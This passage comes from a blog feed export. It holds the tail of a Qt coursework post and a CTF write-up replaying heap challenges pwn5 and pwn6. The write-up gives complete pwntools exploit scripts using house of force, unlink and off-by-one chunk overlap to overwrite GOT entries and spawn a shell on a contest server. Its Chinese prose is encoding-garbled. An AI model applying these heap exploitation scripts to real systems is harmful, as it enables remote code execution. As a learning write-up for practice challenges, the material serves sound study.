class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//tableæ§ä»¶</span></span><br><span class="line">    <span class="comment">//è®¾ç½®åˆ—æ•°</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setColumnCount(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ°´å¹³è¡¨å¤´</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class="string">"å§“å"</span> &lt;&lt;<span class="string">"æ€§åˆ«"</span> &lt;&lt; <span class="string">"å¹´é¾„"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®è¡Œæ•°</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setRowCount(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ­£æ–‡</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setItem(<span class="number">0</span>,<span class="number">0</span>,<span class="keyword">new</span> QTableWidgetItem(<span class="string">"å‹ç¼©"</span>));</span><br><span class="line">    <span class="comment">//åˆ—è¡¨</span></span><br><span class="line">    QList&lt;QString&gt; namelist;</span><br><span class="line">    QStringList sexlist;</span><br><span class="line">    sexlist &lt;&lt; <span class="string">"ç”·"</span> &lt;&lt; <span class="string">"ç”·"</span> &lt;&lt; <span class="string">"ç”·"</span>  &lt;&lt; <span class="string">"ç”·"</span>ï¼›</span><br><span class="line">    namelist &lt;&lt; <span class="string">"ll"</span> &lt;&lt; <span class="string">"aa"</span> &lt;&lt; <span class="string">"11"</span>;</span><br></pre></td></tr></table></figure><h3 id="4-å…¶ä»–æ§ä»¶"><a href="#4-å…¶ä»–æ§ä»¶" class="headerlink" title="4.å…¶ä»–æ§ä»¶"></a>4.å…¶ä»–æ§ä»¶</h3><p>éœ€è¦çš„æ—¶å»çœ‹åº“å§</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png" alt="image-20201210104641479"></p><h2 id="0x09-Qfileæ–‡ä»¶è¯»å†™"><a href="#0x09-Qfileæ–‡ä»¶è¯»å†™" class="headerlink" title="0x09 Qfileæ–‡ä»¶è¯»å†™"></a>0x09 Qfileæ–‡ä»¶è¯»å†™</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png" alt="image-20201214083900742"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png" alt="image-20201214083912652"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&quot;&gt;&lt;a href=&quot;#ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&quot; class=&quot;headerlink&quot; title=&quot;ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&quot;&gt;&lt;/a&gt;ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&lt;/h1&gt;&lt;p&gt;å›¾å½¢åŒ–ç¼–ç¨‹&lt;/p&gt;
&lt;p&gt;è¿™ä¸åŒè¯­è¨€åˆ†æ•°è¿˜ä¸å¤ªä¸€æ ·ï¼Œæœ€åç”¨Qtäº†&lt;/p&gt;
&lt;p&gt;å››ä¸ªæ˜ŸæœŸå››ä¸ª</summary>
      
    
    
    
    <category term="Qt" scheme="https://pz1o.top/categories/Qt/"/>
    
    
    <category term="Qt" scheme="https://pz1o.top/tags/Qt/"/>
    
    <category term="å®éªŒ" scheme="https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>æ–°ç”Ÿèµ›å¤ç°</title>
    <link href="https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-06T14:22:34.000Z</published>
    <updated>2020-12-23T09:07:46.902Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>ç»ˆäºè€ƒå®Œè¯•äº†ï¼Œè¿™è€ƒå‰å­¦çœŸä¸æ˜¯äººå¹²çš„ï¼Œä¸Šè¯¾è¿˜æ˜¯å¾—å¬ä¸€å¬</p><p>å¤ç°ä¸€ä¸‹è¿™å‡ é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ å †çš„çŸ¥è¯†</p><hr><p>æ·¦ æˆ‘æ˜¯fw æ‹–äº†äº”å¤© ç»ˆäºæ¥å¤ç°äº†</p><p>ä½†å‘ç°å †å·²ç»å¿˜å¾—å·®ä¸å¤šäº†</p><p>å…ˆå¤ä¹ å †çš„åŸºç¡€çŸ¥è¯†</p><p><a href="https://blog.csdn.net/qq_41453285/category_9150569.htmlï¼ˆæµ…æ˜¾æ˜“æ‡‚ï¼Œéå¸¸é€‚åˆæ–°æ‰‹å­¦ï¼‰" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/category_9150569.htmlï¼ˆæµ…æ˜¾æ˜“æ‡‚ï¼Œéå¸¸é€‚åˆæ–°æ‰‹å­¦ï¼‰</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>å®˜æ–¹wp</p><blockquote><p>åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡»</p><p>å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><p>å…ˆæ¥çœ‹ä¸€ä¸‹house of force</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a><strong>house of force</strong></h2><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><ul><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</li></ul><p><strong>åˆ©ç”¨æ­¥éª¤</strong></p><p>(1)é¦–å…ˆå…ˆæ³„éœ²å‡ºå †åœ°å€ã€‚</p><p>(2)åˆ©ç”¨å †æº¢å‡ºï¼Œå°†top chunkçš„sizeåŸŸä¿®æ”¹ä¸ºå¾ˆå¤§çš„æ•°</p><p>(3)ç”³è¯·å¤§å—å†…å­˜(å¯ä»¥é€šè¿‡å †åœ°å€å’Œç›®æ ‡åœ°å€çš„è·ç¦»è¿›è¡Œè®¡ç®—)ï¼Œä½¿å¾—top chunkçš„å¤´éƒ¨è½åœ¨ç›®æ ‡åœ°å€èŒƒå›´å†…ã€‚</p><p>(4)å†æ¬¡ç”³è¯·å†…å­˜ï¼Œé‚£ä¹ˆæ–°ç”³è¯·çš„å†…å­˜å³ä¸ºç›®æ ‡åœ°å€ï¼Œé€šå¸¸æƒ…å†µä¸‹(æœªå¼€å¯FullRelro)ï¼Œä¸€èˆ¬æ˜¯å°†ç›®æ ‡åœ°å€è®¾ä¸ºgotè¡¨åœ°å€ã€‚</p><p>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œæ ¹æ®å‰é¢å †æ•°æ®ç»“æ„éƒ¨åˆ†çš„çŸ¥è¯†æˆ‘ä»¬å¾—çŸ¥ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</p><p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunk æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p><p>å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡å¼„å †é¢˜ æ‰€ä»¥å°½é‡å¼„å¾—æ¸…æ¥šä¸€ç‚¹</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png" alt="image-20201213122054112"></p><p>è¿˜æœªè¿›å…¥èœå• å †ä¸­æƒ…å†µ</p><p>ä¸¤ä¸ªæŒ‡é’ˆ</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png" alt="image-20201213122653935"></p><p>æ·»åŠ ä¸€ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">"aaaa"</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png" alt="image-20201213140931866"></p><p>ä¿®æ”¹top chunkå¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png" alt="image-20201213170620443"></p><p>è¿™æ—¶ æˆ‘ä»¬éœ€è¦æŠŠtopæŒ‡é’ˆæŒ‡å‘å †åº•ï¼Œä»è€Œæ”¹å˜å‡½æ•°æŒ‡é’ˆ</p><p>é‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆç”³è¯·å¤§å°å‘¢ï¼Œæˆ‘ä»¬éœ€è¦â€œåæ’¤æ­¥â€ï¼Œå°±æ˜¯è´Ÿå‘ç”³è¯·åœ°å€ã€‚é‚£å¤§å°å‘¢ï¼Œæœ€èµ·ç åº”è¯¥æ˜¯0x40+0x20ï¼Œç„¶ååŠ ä¸Šä¸€ä¸ªå¤´éœ€è¦çš„åœ°å€ï¼ˆ0xfï¼‰ä¸å°¾éƒ¨topå‰å¯ç”¨çš„ç©ºé—´ï¼ˆ0x8ï¼‰ã€‚</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png" alt="image-20201213175814153"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è´Ÿå‘ç”³è¯·ç„¶åæ‰“è¿‡å»ï¼Œç„¶åè¿™é‡Œåº”è¯¥å¯ä»¥åªè¦ç”³è¯·è¶³å¤Ÿå¤§ ç„¶åæŠŠé‡Œé¢å†…å®¹å…¨è¦†ç›–ä¸ºåé—¨å‡½æ•° ç›´æ¥è°ƒç”¨åº”è¯¥éƒ½å¯ä»¥</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>å¯ä»¥å»çœ‹æˆ‘åˆšæ€»ç»“çš„å †</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level = 'debug'</span><br><span class="line">p = process('./pwn5')</span><br><span class="line">#p = remote('219.219.61.234','10014')</span><br><span class="line">elf = ELF('./pwn5')</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line">def add(<span class="built_in">size</span>,con):</span><br><span class="line">p.sendlineafter('Your choice:','2')</span><br><span class="line">p.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class="line">p.sendafter('Plz input the name:',con)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter('Your choice:','4')</span><br><span class="line">p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter('Your choice:','1')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">change</span><span class="params">(idx,<span class="built_in">size</span>,con)</span>:</span></span><br><span class="line">    p.sendlineafter('Your choice:','3')</span><br><span class="line">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class="line">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class="line">buf = <span class="number">0x06020b8</span></span><br><span class="line">sys = <span class="number">0x400D1B</span></span><br><span class="line">add(0x60,'ccc')</span><br><span class="line">add(0x58,'aaa')</span><br><span class="line">add(0x80,'bbb')</span><br><span class="line">add(0x60,'eee')</span><br><span class="line">add(0x60,'fff')</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(buf - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x50</span>)+p8(<span class="number">0x90</span>) </span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0x60</span>)*<span class="number">3</span>+ p64(<span class="number">0x6020a8</span>))</span><br><span class="line">change(1,0x40,p64(elf.got['free']))</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,p64(sys)*<span class="number">2</span>)</span><br><span class="line"><span class="meta"># delete(3)</span></span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h1><blockquote><p>changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™</p><p>æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell</p></blockquote><p>æ¯•ç«Ÿä¸€å¼€å§‹åšå †é¢˜ï¼Œä¸Šæ¥å…ˆåˆ†æï¼Œå°½é‡è¯¦ç»†ç‚¹</p><blockquote><p>addå‡½æ•°</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png" alt="image-20201219204952738"></p><p>å…¶ä¸­æ•°æ®ç»“æ„ä¸º</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png" alt="image-20201219205027638"></p><p>changeå‡½æ•°</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png" alt="image-20201219205113774"></p></blockquote><p>ç›´æ¥çœ‹expåˆ†æå§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>å…ˆè¯´ä¸€ä¸‹æ€è·¯</p><ul><li>å•å­—èŠ‚æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹chunk_sizeæ¥overlapï¼Œè¾¾åˆ°ä»»æ„è¯»å†™çš„ç›®çš„</li><li>ç”±äºåé—¨å‡½æ•°æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åº”è¯¥æƒ³è°ƒç”¨systemå‡½æ•°ï¼Œé¦–è¦çš„å°±æ˜¯æ³„éœ²libcåŸºå€ï¼Œå…¶æ¬¡è·å–systemå‡½æ•°</li><li>æ”¹freeçš„gotè¡¨ è¾¾åˆ°è°ƒç”¨</li></ul><p>è¿™é‡Œæ¥å†™ä¸€ä¸‹expçš„æ€è·¯</p><ol><li>å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼Œä¹‹åä¿®æ”¹ç¬¬ä¸€ä¸ªå †å—ï¼Œç¬¬ä¸€ä¸ªå †å—å¯ä»¥å†™å…¥/bin/shçš„å‚æ•°ï¼Œç„¶åæˆ‘ä»¬ä¿®æ”¹ç¬¬äºŒä¸ªå †å—çš„sizeï¼Œä½¿å…¶è¿›å…¥fastbinä¸­ï¼Œè®©æˆ‘ä»¬å†æ¬¡åˆ†é…</li><li>æˆ‘ä»¬è¿›è¡Œé‡æ–°åˆ†é…ï¼Œè¿™æ˜¯å°±å¯ä»¥ä»»æ„å†™ï¼ŒæŠŠgotè¡¨ä¸­çš„freeå†™è¿›å»ï¼Œç„¶åè¯»å‡ºæ¥ï¼Œæ³„éœ²åŸºå€</li><li>ä¿®æ”¹freeçš„gotè¡¨ä¸ºsystemçš„åœ°å€ç„¶åç›´æ¥free(0)ä¹Ÿå°±è°ƒç”¨äº†/bin/sh</li></ol><p>ä¸‹é¢æ˜¯å…³é”®æˆªå›¾</p><p>å†™å…¥/bin/sh</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png" alt="image-20201220211422639"></p><p>é‡Šæ”¾1ä¹‹å</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png" alt="image-20201220211752814"></p></blockquote><h2 